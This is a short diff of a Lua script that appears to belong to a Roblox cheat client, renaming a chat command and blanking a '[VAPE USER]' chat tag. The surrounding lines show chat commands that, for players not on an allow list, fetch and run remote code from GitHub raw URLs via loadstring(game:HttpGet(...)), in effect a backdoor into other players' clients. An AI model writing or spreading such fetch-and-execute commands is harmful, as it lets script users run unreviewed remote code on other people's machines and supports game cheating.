@@ -10603,7 +10603,7 @@ local commands = {
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/ProReleased/ProReleased/main/Rick"))()
 		end
 	end,
-	[".chip"] = function()
+	[".xylex"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/ProReleased/ProReleased/main/Chip"))()
 		end
@@ -10747,7 +10747,7 @@ txt.OnIncomingMessage = function(msg)
 		local userType = 0
 		local hasTag = false
 		if users[plr2.UserId] ~= nil then
-			p.PrefixText = "<font color='"..colors["yellow"].."'>[VAPE USER]</font> " .. msg.PrefixText
+			p.PrefixText = "<font color='"..colors["yellow"].."'>[]</font> " .. msg.PrefixText
 			hasTag = true
 			return p
 		end
